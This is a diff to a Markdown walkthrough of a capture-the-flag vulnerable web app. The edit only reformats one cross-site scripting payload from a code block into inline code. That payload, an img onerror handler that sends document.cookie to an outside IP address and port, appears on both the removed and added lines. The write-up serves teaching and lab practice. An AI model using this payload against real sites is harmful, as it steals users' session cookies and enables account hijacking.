@@ -21,9 +21,8 @@ description: "Mini CTF Vulnerable Web App – - A walkthrough of the challenge w
 ![image2](../resources/da75ca20153e48c98a269378acaa017d.png)
 
 - Use payload:
-```bash
-<img src=x onerror="location.href='http://10.102.120.158:8001/?c='+ document.cookie">
 
-```
+`<img src=x onerror="location.href='http://10.102.120.158:8001/?c='+ document.cookie">`
+
 
 ![image3](../resources/14d26214249741618a0004b3d39c7f64.png)
